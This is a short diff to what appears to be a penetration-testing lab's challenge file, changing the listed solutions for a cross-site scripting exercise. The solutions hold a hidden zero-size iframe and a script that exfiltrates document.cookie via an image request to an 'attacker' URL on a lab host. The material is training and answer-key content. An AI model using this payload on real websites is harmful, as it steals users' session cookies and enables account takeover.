@@ -14,8 +14,7 @@
   - http://myhomepage.#PENTESTLAB-DOMAIN#/admin
 :solutions:
   - |
-    <h1>Attackers place</h1>
-    Thank you for your cooperation!
+    <script type='text/javascript' src='/jquery-2.2.3.min.js'></script>
     <iframe onload='attack()' style='border: none;width:0; height:0' src='http://clonecloud.example.org/view.cgi'></iframe>
     <script>
       var payload = 'document.write("<img src=\'http://myhomepage.#PENTESTLAB-DOMAIN#/attacker?cookie="+document.cookie+"\' />")';
@@ -24,6 +23,7 @@
       };
     </script>
   - |
+    <script type='text/javascript' src='/jquery-2.2.3.min.js'></script>
     <h1>Attackers place</h1>
     Thank you for your cooperation!
     <iframe onload='attack()' style='border: none;width:0; height:0' src='http://clonecloud.#PENTESTLAB-DOMAIN#/view.cgi'></iframe>
